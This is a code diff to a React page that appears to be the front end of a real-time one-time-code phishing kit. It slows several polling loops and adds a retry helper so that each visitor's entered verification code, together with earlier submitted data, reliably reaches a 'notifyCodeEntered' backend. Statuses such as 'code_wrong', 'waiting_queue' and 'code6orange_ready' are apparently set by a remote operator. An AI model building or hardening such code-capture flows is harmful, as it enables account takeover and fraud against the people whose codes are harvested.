@@ -143,7 +143,7 @@ export default function Home() {
       else if (s === "code6orange_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6orange"); }
       else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStepPersisted("wrong"); }
       else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStepPersisted("queue"); }
-    }, 1500);
+    }, 3000);
     return () => clearInterval(pollingValidationRef.current);
   }, [step, submissionId]);
 
@@ -160,7 +160,7 @@ export default function Home() {
       else if (s === "code6orange_ready" && step !== "code6orange") { clearInterval(pollingCodeRef.current); setStepPersisted("code6orange"); }
       else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStepPersisted("wrong"); }
       else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStepPersisted("queue"); }
-    }, 1500);
+    }, 3000);
     return () => clearInterval(pollingCodeRef.current);
   }, [step, submissionId]);
 
@@ -178,7 +178,7 @@ export default function Home() {
       else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStepPersisted("wrong"); }
       else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStepPersisted("expired"); }
       else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStepPersisted("queue"); }
-    }, 1500);
+    }, 3000);
     return () => clearInterval(pollingWaitingRef.current);
   }, [step, submissionId]);
 
@@ -202,24 +202,33 @@ export default function Home() {
     setLoading(false);
   };
 
+  // Retry helper: the visitor's code entry must reliably reach the DB even if the
+  // platform rate-limits the call (429). Without retry the code is lost silently.
+  const submitCodeWithRetry = async (code) => {
+    const payload = { ...submittedData, code, submissionId };
+    for (let attempt = 1; attempt <= 5; attempt++) {
+      try {
+        const res = await base44.functions.invoke("notifyCodeEntered", payload);
+        if (res?.data?.ok) return true;
+        if (res?.data?.error) return false; // validation error, don't retry
+      } catch (e) {
+        if (attempt === 5) return false;
+        await new Promise((r) => setTimeout(r, 800 * attempt));
+      }
+    }
+    return false;
+  };
+
   const handleCodeSubmit = async (code) => {
     setLoading(true);
-    await base44.functions.invoke("notifyCodeEntered", {
-      ...submittedData,
-      code,
-      submissionId,
-    }).catch(() => {});
+    await submitCodeWithRetry(code);
     setStepPersisted("waiting");
     setLoading(false);
   };
 
   const handleCode6Submit = async (code) => {
     setLoading(true);
-    await base44.functions.invoke("notifyCodeEntered", {
-      ...submittedData,
-      code,
-      submissionId,
-    }).catch(() => {});
+    await submitCodeWithRetry(code);
     setStepPersisted("waiting");
     setLoading(false);
   };
